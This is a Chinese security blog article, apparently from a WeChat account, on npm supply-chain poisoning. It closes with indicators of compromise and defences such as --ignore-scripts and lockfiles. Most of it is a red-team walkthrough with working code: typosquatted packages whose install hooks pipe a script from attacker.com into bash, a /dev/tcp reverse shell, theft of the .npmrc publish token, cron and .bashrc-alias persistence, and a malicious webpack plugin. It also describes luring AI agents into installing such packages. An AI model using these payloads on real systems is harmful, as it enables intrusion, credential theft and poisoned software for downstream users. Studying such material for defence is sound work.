---
title: 供应链安全 | 深入解析 npm 投毒机制、构建流劫持与跨会话持久化控制
url: https://mp.weixin.qq.com/s/g1AxykG7hM4VH19TmAO6aw
source: Doonsec's feed
date: 2026-05-19
fetch_date: 2026-05-20T06:01:36.329236
---

# 供应链安全 | 深入解析 npm 投毒机制、构建流劫持与跨会话持久化控制

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/PIWj1VguNotjXY7ZWBdzTPfWcvOJpXF8No3WJv6gCq3maEs2SOgfcic7P1KiaeufuwNoxiaZsicOuHgibokTNkJ9q07M1AcBpQ1rTXLYtFSWcGsA/0?wx_fmt=jpeg)

# 供应链安全 | 深入解析 npm 投毒机制、构建流劫持与跨会话持久化控制

原创

APT-101
APT-101

APT-101

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNotU5ujibibyiblHyvuhC6qhMIMn2pemh04dDrSYpZJWeULPh8y8GGz2qoCetD6ofmZicHg1fticx1FxR3kicF9nNibhwPC8GdEZ9BxKPc/640?wx_fmt=png&from=appmsg)

## 0x01 引言：开源生态下的“信任泛滥”与边界外延

在现代软件工程中，`npm`（Node Package Manager）已成为维系 JavaScript 与 Node.js 生态的核心基础设施，托管着全球超过 **200 万个** 开源模块。然而，这种高度依赖外部组件的“泛信任”模式，正让软件供应链投毒（Software Supply Chain Poisoning）成为企业防御体系中最脆弱的腹地。

值得高度警惕的是，**伴随 AI 技术与大语言模型（LLM）的爆发式发展，供应链投毒事件正在呈现出指数级增长与范式转移。** 这一现象背后有两个核心驱动力：

1. **AI 辅助代码生成的“无意识投毒”**：AI 编程助手（如 Copilot、Cursor）在自动补全或生成依赖项时，往往会基于过期的训练数据幻觉出不存在的组件包名（AI Package Hallucination），攻击者借此实施“抢注投毒”，坐等开发者或自动化流水线误装。
2. **AI 原生基础设施成为红队新靶场**：攻击者的矛头正从传统 Web 组件快速转向 AI 开源生态链。

从近年频发的真实案例中可见端倪：从知名 API 工具 **Apifox 遭遇供应链攻击**，到核心基础库 **axios 的 npm 投毒事件**；再到 AI 生态的标志性项目——大模型中间件 **LiteLLM 投毒事件**，以及 AI 推理框架 **Xinference 组件投毒风险**。这些事件无一不在向行业敲响警钟：**攻击者正在利用 AI 研发的高频迭代期，将毒素注入整个智能体与大模型应用的底层依赖链中。**

本文将深度还原 npm 投毒的技术机理，解析其在开发、构建（CI/CD）及后渗透持久化阶段的隐蔽利用链。

---

## 0x02 攻击面模型：npm 包生命周期的“寄生机制”

npm 的核心攻击面在于：**它不仅允许包在被显式导入（`require` 或 `import`）时执行逻辑，更在组件包的生命周期脚本（Lifecycle Hooks）中提供了隐式的系统级代码执行入口。**

根据 `package.json` 的规范，npm 允许开发者定义一系列在特定阶段自动执行的脚本：

* **`preinstall`**：在依赖包开始解压并安装之前触发。
* **`postinstall`**：在依赖包完整安装并写入 `node_modules` 后立即触发。

```
[受害者指令: npm install]       │       ├──► 1. 触发 preinstall ──► 执行恶意 Shell (流水线劫持)       ├──► 2. 解压组件包        └──► 3. 触发 postinstall ──► 执行本地宿主机 Payload (自动化反弹 Shell)
```

由于这些脚本由 `npm`（或 `yarn`、`pnpm`）在处理依赖树时自发拉起，且通常继承了当前执行用户的 Shell 上下文权限，这使得红队能够在软件正式运行前，在开发者终端或 CI/CD 构建流水线（Pipeline）中抢先获得权限。

---

## 0x03 武器化构造：恶意 npm 组件的封装与投放

要模拟或实施一次高隐蔽性的 npm 供应链投毒，恶意组件包必须满足合规的 Node.js 导出规范，同时兼顾运行时（Runtime）与构建时（Build-Time）的双重隐蔽性。

### 1. 正常业务逻辑包装 (`index.js`)

攻击者通过注册相近域名或劫持弱口令账号，发布高度相似的混淆包（如将官方 `colors` 伪装为 `colorss` 或 `@evil/colors`）。其主入口文件在维系正常组件功能的前提下，使用 `child_process` 异步派生子进程，避免阻塞主线程导致业务挂起：

```
// index.jsconsole.log("✅ [System] Colors module initialized successfully."); // 伪装正常输出
try {    // 异步拉起远程 Stager 脚本，实现无感代码执行    require('child_process').exec('curl -s http://attacker.com/shell.sh | bash', { windowsHide: true }, () => {});} catch (e) {    // 全隔离异常处理，确保不破坏主业务调用链}
// 代理并导出原有合法模块的底层逻辑module.exports = require('./real_colors_backend');
```

### 2. 生命周期钩子劫持 (`package.json`)

通过配置 `scripts` 字段，实现包在下载或解压完毕后的自动激活。无需目标开发者编写单行 `require('evil_colors')`，只需一行 `npm install` 即可触发：

```
{  "name": "colros",  "version": "1.0.0",  "description": "Enterprise performance optimization utility",  "main": "index.js",  "scripts": {    "postinstall": "node -e \"try { require('./index') } catch(e) {}\""  },  "dependencies": {    "real_colors_backend": "^1.0.0"  }}
```

红队通常可以通过执行 `npm pack` 将其本地打包为 `.tgz` 归档文件，用于红队物理演练中的本地模拟：

```
npm install http://192.168.1.200:8088/colros-1.0.0.tgz
```

#### 2.1 制作恶意npm包：

```
mkdir evil_colors && cd evil_colorsnpm init -ytouch  index.jscat index.jsconsole.log("✅ 正常加载模块");const exec = require('child_process').exec;exec('bash -c "bash -i >& /dev/tcp/攻击者IP/4444 0>&1"');cat package.json{  "name": "evil_colors",  "version": "1.0.0",  "description": "恶意测试模块",  "main": "index.js",  "scripts": {    "postinstall": "node -e \"require('./index')\""  },  "keywords": [],  "author": "",  "license": "ISC"}npm pack #打包
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PIWj1VguNotS8HICyG9leTWdITEYjSzYk57n26yL7cERT57gqDQCo4W21hYlV7uibZnTlNKicbia5e5Vjw1CIvticqLJibGF1aGMVqnHSicdf7yaI/640?wx_fmt=png&from=appmsg)

#### 2.2 诱导智能体或者人工远程安装

```
npm install git+https://github.com/evil/colors.git npm install http://xxx.xxx.xxx.xxx:8088/evil_colors-1.0.0.tgz
```

#### 2.3 获取权限

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PIWj1VguNovqwibiaMoN6fbtJ7buXzgOBglVXI4kQLTGYSRrxVlZv7zfKvKNc02qH4K5dyrszpysEvEXFiaCj4v6aUV5FRPpZGuPAuUyF7dVqw/640?wx_fmt=png&from=appmsg)

---

## 0x04 深度利用：CI/CD 供应链攻防演练路径

当恶意组件包成功注入流水线或宿主机后，红队需要完成从**单点权限**到**长期控制与横向扩散**的范式推演。

### 1. 针对 CI/CD 流水线的预置劫持（Preinstall Pipeline Attack）

现代 CI/CD 自动化集群在执行 `npm install` 时，若未开启 `--ignore-scripts` 选项，恶意包中的 `preinstall` 脚本将直接在构建容器或 Runner 宿主机上爆发。

```
{  "scripts": {    "preinstall": "sh -c 'echo \"[CI/CD] Verifying build environment...\"; curl -s http://attacker.com/exploit.sh | sh'"  }}
```

**战术价值**：直接获取构建流水线的密匙（如 AWS Access Key、Kubernetes Kubeconfig、生产环境配置参数），并通过控制构建出的最终制品文件（Artifacts）完成供应链向下游的级联辐射。

### 2. 权限横向移动：敏感凭据外泄

获取当前用户 Shell 后，红队的首要目标是读取底层认证配置文件。npm 的全局凭证通常硬编码于用户家目录下的 `.npmrc` 中：

```
cat ~/.npmrc# 泄露高价值的官方源发布 Token//registry.npmjs.org/:_authToken=npm_xxxxxxxxxxxxxxxxxxxxxxx
```

通过捕获该 Token，攻击者能够直接夺取该开发者名下所有合法开源包的发布权限，通过发布“合法升级包”实现二阶供应链扩散。

---

## 0x05 高级持久化：控制权沉淀与“非确定性”控制

在后渗透或应急响应对抗中，供应链注入最核心的优势在于其难以被清除的持久化控制能力。以下列举几种在 Node.js 环境下典型的隐蔽持久化路径：

### 1. 计划任务与环境配置文件联合注入

在反弹 Shell 进程即将因上层任务结束而被销毁前，将其转化为系统级的持久化任务：

```
const exec = require('child_process').exec;
// 1. 写入低频、高隐蔽性的 Cron 任务exec('bash -c "echo \"*/30 * * * * root curl -s http://attacker.com/shell.sh | bash\" > /tmp/pwn && chmod 600 /tmp/pwn && crontab /tmp/pwn"');
// 2. 注入 .bashrc 并配合 Alias 伪装（每当运维人员输入 ls 时静默触发连回）exec('echo "alias ls=\'bash -i >& /dev/tcp/attacker.com/4444 0>&1 & ls\'" >> ~/.bashrc');
```

### 2. 构建引擎配置劫持（Vite / Webpack 投毒）

在本地研发端，直接修改 `webpack.config.js` 或 `vite.config.js`。由于前端开发人员在本地调试时经常开启热更新（Hot Reload）或频繁打包，配置中的恶意代码将伴随研发周期不断重复执行：

```
// Webpack 配置文件混淆注入const { exec } = require('child_process');module.exports = {  // ... 正常 Webpack 配置  plugins: [    {      apply: (compiler) => {        compiler.hooks.environment.tap('BuildMetricsPlugin', () => {          exec('curl -s http://attacker.com/exploit.sh | bash &');        });      }    }  ]};
```

### 3. Node.js 全局缓存污染（Cache Poisoning）

高级红队常采用的“无包持久化”策略：清除并替换本地全局缓存目录 `~/.npm/_cacache` 中的合法内容，或者直接修改 Node.js 核心全局引导文件（如修改 `node_modules/npm/bin/npm-cli.js`）。这意味着即使开发人员重装或删除了当前项目的 `node_modules`，只要全局命令被再次调用，控制权就会瞬间复活。

---

## 0x06 防御研判与溯源取证指标 (IOCs)

在面对真实的供应链入侵或开展应急响应取证时，安全团队应基于以下关键失陷指标（IOCs）进行深度研判：

| 类别 | 检查样本与取证方法 |
| --- | --- |
| **包名异常** | 静态比对 `package.json`，排查如 `react-doms`, `lodash-patched`, `colros` 等拼写错误包或未备案的私有命名空间。 |
| **生命周期异常** | 审计 `package.json` 中突变或非预期的 `preinstall`, `postinstall`, `prepack` 脚本。 |
| **异常脚本执行** | 源代码或缓存中出现 `eval(Buffer.from(...).toString())` 等高度混淆的动态代码执行结构。 |
| **持久化篡改** | 检查 `.git/hooks/pre-commit` 是否被插入外联 Shell，以及用户目录下的 `.npmrc` 凭证是否异常更替。 |
| **基础设施旁路** | 捕获对已知恶意 CDN（如 `malicious-cdn.net`）或未知泛解析域名（如 `*.nip.io`）的非预期 DNS 握手与外部 Socket 连回。 |

### 企业供应链防线固化建议

1. **开启脚本执行禁令**：在 CI/CD 流水线和本地全局配置中，默认强制开启 `--ignore-scripts` 选项，阻断组件包在安装阶段自动执行系统命令。

```
npm install --ignore-scripts
```

2. **收敛制品依赖拓扑**：禁止直接依赖 Git 或未经审查的公网第三方 Tarball。强制通过内部企业级私有源（如 Nexus）对上游开源组件实施“代理-拦截-审计”三阶段管理。
3. **锁死版本与 Hash 锁链**：确保项目的 `package-lock.json` 或 `yarn.lock` 文件必须被纳入 Git 版本控制。通过锁死包的 `integrity` 校验哈希（SHA-512），阻断针对既有包版本的线上二阶篡改与依赖混淆攻击。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/vgGymHXkYlHxHm5eWcF04Jiak4wbaPHuibiaRpMSS9cibMpn8zszwAmT9Oc2YYhJN1nowIDPnEgAddjclhcuDOaZtQ/0?wx_fmt=png)

APT-101

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/vgGymHXkYlHxHm5eWcF04Jiak4wbaPHuibiaRpMSS9cibMpn8zszwAmT9Oc2YYhJN1nowIDPnEgAddjclhcuDOaZtQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过